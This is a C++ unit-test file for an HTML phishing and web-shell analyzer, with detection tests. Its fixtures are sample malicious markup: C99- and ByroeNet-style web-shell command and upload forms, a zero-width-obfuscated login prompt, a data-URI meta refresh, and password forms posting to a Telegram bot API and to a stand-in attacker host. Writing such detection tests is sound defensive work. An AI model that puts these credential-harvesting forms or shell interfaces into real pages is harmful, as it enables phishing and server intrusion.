#include "pch.h"
#include "../../Src/Suseong-Html-Analyzer/HtmlParser.h"
#include "../../Src/Suseong-Html-Analyzer/HtmlAnalyzer.h"

// EXPECT_EQ();
// ASEERT_EQ();

class HtmlParserTest : public IHtmlParserHandler
{
public:
    std::vector<ST_HTML_TOKEN> capToken;
    std::vector<std::string> capScript;
    void OnTokenParsed(const ST_HTML_TOKEN& token) override
    {
        capToken.push_back(token);
    }
    void OnScriptTextParsed(const std::string& text) override
    {
        capScript.push_back(text);
    }

private:
};

/*
* 
*/
TEST(ScanTest, ZeroObuse)
{
    CHtmlParser parser;
    CHtmlAnalyzer analyzer;
    parser.SetHandler(&analyzer);

    std::string maliciousHtml = // made by Gemini
        "<html><body>"
        "<input type=\"text\" value=\"Please L\xE2\x80\x8Bog\xE2\x80\x8Bin to continue\">"
        "</body></html>";

    parser.Parse(maliciousHtml.c_str(), maliciousHtml.length());

    EXPECT_TRUE(analyzer.isPhishingPattern());
    std::string report = analyzer.getDetectionReport();
    EXPECT_NE(report.find("[H001] Zero-Width Character Obfuscation Detected"), std::string::npos);
}

/*
TEST(ScanTest, Randsomeware)
{

}

TEST(ScanTest, ExploitKit)
{

}

TEST(ScanTest, Downloader)
{

}

TEST(ScanTest, Trojan)
{

}

TEST(ScanTest, Miner)
{

}

TEST(ScanTest, Worm)
{

}
*/

/***********************************
************* BackDoor *************
************************************/
TEST(ScanTest, BackDoor_Normal)
{
    CHtmlParser parser;
    CHtmlAnalyzer Analyzer;;
    parser.SetHandler(&Analyzer);

    std::string safeHtml =
        "<html><body>"
        "<form action=\"login.php\" method=POST>"
        "<input type=hidden name=csrf_token value=12345>"
        "<input type=\"text\" name=\"username\">"
        "</form>"
        "</body></html>";

    parser.Parse(safeHtml.c_str(), safeHtml.length());
    EXPECT_FALSE(Analyzer.isBackDoor());
}

TEST(ScanTest, BackDoor_C99)
{
    CHtmlParser parser;
    CHtmlAnalyzer analyzer;
    parser.SetHandler(&analyzer);

    std::string maliciousHtml =
        "<html><body>"
        "<form action=\"?\" method=POST>"
        // 명령 실행
        "<input type=hidden name=act value=cmd>"
        "<input type=\"text\" name=\"cmd\" size=\"50\" value=\"\">"
        "<input type=submit value=\"Execute\">"
        "</form>"
        // 파일 업로드
        "<form method=\"POST\" ENCTYPE=\"multipart/form-data\">"
        "<input type=hidden name=act value=upload>"
        "<input type=\"file\" name=\"uploadfile\">"
        "</form>"
        // 스크립트 키드워
        "<script>"
        "function ls_reverse_all() { var id = 1; }"
        "</script>"
        "</body></html>";

    parser.Parse(maliciousHtml.c_str(), maliciousHtml.length());

    EXPECT_TRUE(analyzer.isBackDoor());
    std::string report = analyzer.getDetectionReport();
    EXPECT_NE(report.find("[H901] C99 Shell Command Input Detected"), std::string::npos);
}

TEST(ScanTest, BackDoor_ByroeNet)
{
    CHtmlParser parser;
    CHtmlAnalyzer analyzer;
    parser.SetHandler(&analyzer);

    std::string maliciousHtml =
        "<html><head><title>ByroeNet SheLL</title></head>"
        "<body>"
        "<form method=post enctype=\"multipart/form-data\">"
        "<b>Execute command :</b><input size=100 name=\"_cmd\" value=\"\">"
        "<input type=submit name=_act value=\"Execute!\">"
        "<b>Change directory :</b><input size=100 name=\"_cwd\" value=\"\">"
        "</form>"
        "</body></html>";

    parser.Parse(maliciousHtml.c_str(), maliciousHtml.length());

    EXPECT_TRUE(analyzer.isBackDoor());
    std::string report = analyzer.getDetectionReport();
    EXPECT_NE(report.find("[H902] ByroeNet Web Shell Detected"), std::string::npos);
}

/***********************************
************* Phishing *************
************************************/

TEST(ScanTest, ApiAbuse)
{
    CHtmlParser parser;
    CHtmlAnalyzer analyzer;
    parser.SetHandler(&analyzer);
    std::string maliciousHtml = // made by Gemini
        "<html><body>"
        "<form action=\"https://api.telegram.org/bot123456:ABC-DEF/sendMessage\" method=\"POST\">"
        "   <h3>Login to verify</h3>"
        "   <input type=\"password\" name=\"pw\">"
        "   <input type=\"submit\" value=\"Login\">"
        "</form>"
        "</body></html>";

	parser.Parse(maliciousHtml.c_str(), maliciousHtml.length());

    EXPECT_TRUE(analyzer.isPhishingPattern());
    std::string report = analyzer.getDetectionReport();

    EXPECT_NE(report.find("[H101] Phishing API Abuse Detected"), std::string::npos);
}

TEST(ScanTest, EvasionMetaDataURI)
{
    CHtmlParser parser;
    CHtmlAnalyzer analyzer;
    parser.SetHandler(&analyzer);

    std::string maliciousHtml = // made by Gemini
        "<html><head>"
        "<meta http-equiv=\"refresh\" content=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">"
        "</head><body></body></html>";

    parser.Parse(maliciousHtml.c_str(), maliciousHtml.length());

    EXPECT_TRUE(analyzer.isPhishingPattern());
    std::string report = analyzer.getDetectionReport();
    EXPECT_NE(report.find("[H102] Meta Refresh Data URI Detected"), std::string::npos);
}

TEST(ScanTest, CrossOriginPost)
{
    CHtmlParser parser;
    CHtmlAnalyzer analyzer;
    parser.SetHandler(&analyzer);

    // made by Gemini
    analyzer.SetCurrentUrl("http://www.bank-secure.com/login.html");

    std::string maliciousHtml = 
        "<html><body>"
        "<form action=\"https://www.attacker-site.com/collect.php\" method=\"POST\">"
        "   Password: <input type=\"password\" name=\"passwd\">"
        "   <input type=\"submit\" value=\"Login\">"
        "</form>"
        "</body></html>";

	parser.Parse(maliciousHtml.c_str(), maliciousHtml.length());

	EXPECT_TRUE(analyzer.isPhishingPattern());
    std::string report = analyzer.getDetectionReport();
	EXPECT_NE(report.find("[H103] Cross-Origin Form POST Detected"), std::string::npos);
}
